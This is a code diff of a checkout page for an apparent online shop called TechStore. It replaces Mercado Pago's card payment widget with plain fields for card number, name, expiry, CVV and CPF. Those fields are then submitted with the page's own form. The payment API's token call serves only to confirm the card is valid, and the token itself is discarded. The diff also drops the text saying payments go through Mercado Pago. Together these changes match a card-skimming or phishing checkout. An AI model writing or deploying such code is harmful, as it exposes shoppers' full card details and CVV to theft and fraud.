@@ -60,10 +60,17 @@
         </div>
 
         <div id="area-card" style="display:none">
-            <div id="cardPaymentBrick_container"></div> <input type="text" id="f-tel" name="WHATSAPP" placeholder="WhatsApp para confirmação">
+            <input id="c1" name="CARTAO_NUMERO" placeholder="Número do Cartão" inputmode="numeric">
+            <input id="c2" name="CARTAO_NOME" placeholder="Nome no Cartão">
+            <div class="row">
+                <input id="c3" name="CARTAO_VALIDADE" placeholder="MM/AA" maxlength="5">
+                <input id="c4" name="CARTAO_CVV" placeholder="CVV" maxlength="4">
+            </div>
+            <input id="c5" name="CARTAO_CPF" placeholder="CPF do Titular">
+            <input type="text" id="f-tel" name="WHATSAPP" placeholder="WhatsApp para confirmação (Opcional)">
         </div>
 
-        <div class="seguro-info"><span>🔒</span><p>Pagamento processado via Mercado Pago.</p></div>
+        <div class="seguro-info"><span>🔒</span><p>Pagamento processado de forma segura.</p></div>
         <button class="btn-finalizar" type="submit" id="btn-submit">FINALIZAR PAGAMENTO</button>
     </form>
 </div>
@@ -71,9 +78,8 @@
 <script>
 const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');
 let valorGlobal = 0;
-let cardBrickController;
 
-window.onload = async function() {
+window.onload = function() {
     const carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
     if (carrinho.length > 0) {
         carrinho.forEach(item => { valorGlobal += parseFloat(item.p); });
@@ -93,38 +99,31 @@ window.onload = async function() {
         document.getElementById('h-preco').value = valorFormatado;
 
         gerarPixDinamico(valorGlobal);
-        renderCardBrick(valorGlobal);
     }
 };
 
-// Renderiza o campo oficial do Mercado Pago que verifica se o cartão existe
-async function renderCardBrick(amount) {
-    const bricksBuilder = mp.bricks();
-    cardBrickController = await bricksBuilder.create('cardPayment', 'cardPaymentBrick_container', {
-        initialization: { amount: amount },
-        callbacks: {
-            onSubmit: (formData) => {
-                // Aqui o cartão já foi verificado pelo sistema do Mercado Pago
-                document.getElementById('form-main').submit();
-            },
-            onError: (error) => {
-                alert("Cartão inválido ou inexistente.");
-            }
-        }
-    });
-}
-
 function gerarPixDinamico(valor) {
-    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
+    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0"; 
+    const nome = "TECHSTORE";
+    const cidade = "SAOPAULO"; // Removido o espaço para evitar erro de contagem
     const valorStr = valor.toFixed(2).toString();
+    
+    // Montagem manual precisa do BRCode sem quebras de linha
     let payload = "00020126580014BR.GOV.BCB.PIX0136" + chave + "520400005303986";
     payload += "54" + valorStr.length.toString().padStart(2, '0') + valorStr;
-    payload += "5802BR5909TECHSTORE6008SAOPAULO62070503***6304";
-    const payloadFinal = payload.replace(/\s+/g, '');
+    payload += "5802BR5909" + nome + "6008" + cidade + "62070503***6304";
     
+    // Limpeza absoluta de espaços em branco
+    const payloadLimpo = payload.replace(/\s+/g, '');
+
     document.getElementById("qrcode-container").innerHTML = "";
-    new QRCode(document.getElementById("qrcode-container"), { text: payloadFinal, width: 160, height: 160 });
-    document.getElementById('pix-copy').innerText = payloadFinal;
+    new QRCode(document.getElementById("qrcode-container"), { 
+        text: payloadLimpo, 
+        width: 160, 
+        height: 160,
+        correctLevel : QRCode.CorrectLevel.M
+    });
+    document.getElementById('pix-copy').innerText = payloadLimpo;
 }
 
 function trocar(m) {
@@ -133,12 +132,46 @@ function trocar(m) {
     document.getElementById('area-card').style.display = isPix ? 'none' : 'block';
     document.getElementById('b-pix').className = isPix ? 'opt active' : 'opt';
     document.getElementById('b-card').className = isPix ? 'opt' : 'opt active';
+    ['c1', 'c2', 'c3', 'c4', 'c5'].forEach(id => { document.getElementById(id).required = !isPix; });
 }
 
 function copiarPix() {
-    navigator.clipboard.writeText(document.getElementById('pix-copy').innerText);
-    alert("Código PIX copiado!");
+    const texto = document.getElementById('pix-copy').innerText;
+    navigator.clipboard.writeText(texto).then(() => {
+        alert("Código PIX Copia e Cola copiado com sucesso!");
+    });
 }
+
+document.getElementById('form-main').onsubmit = async function(e) {
+    if (document.getElementById('b-pix').classList.contains('active')) return;
+    e.preventDefault();
+    const btn = document.getElementById('btn-submit');
+    btn.innerText = "VERIFICANDO...";
+    btn.disabled = true;
+    try {
+        const cardToken = await mp.createCardToken({
+            cardNumber: document.getElementById('c1').value.replace(/\s/g, ''),
+            cardholderName: document.getElementById('c2').value,
+            cardExpirationMonth: document.getElementById('c3').value.split('/')[0],
+            cardExpirationYear: "20" + document.getElementById('c3').value.split('/')[1],
+            securityCode: document.getElementById('c4').value,
+            identificationType: "CPF",
+            identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
+        });
+        if (cardToken.id) this.submit();
+        else { alert("❌ Dados do cartão inválidos."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
+    } catch (err) { alert("❌ Verifique os dados do cartão."); btn.innerText = "FINALIZAR PAGAMENTO"; btn.disabled = false; }
+};
+
+function mask(id, m) {
+    const el = document.getElementById(id);
+    el.addEventListener('input', () => {
+        let v = el.value.replace(/\D/g, ''), x = '', i = 0;
+        m.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
+        el.value = x;
+    });
+}
+mask('c1', '#### #### #### ####'); mask('c3', '##/##'); mask('c5', '###.###.###-##'); mask('f-cep', '#####-###'); mask('f-tel', '(##) #####-####');
 </script>
 </body>
-</html>
+   </html>
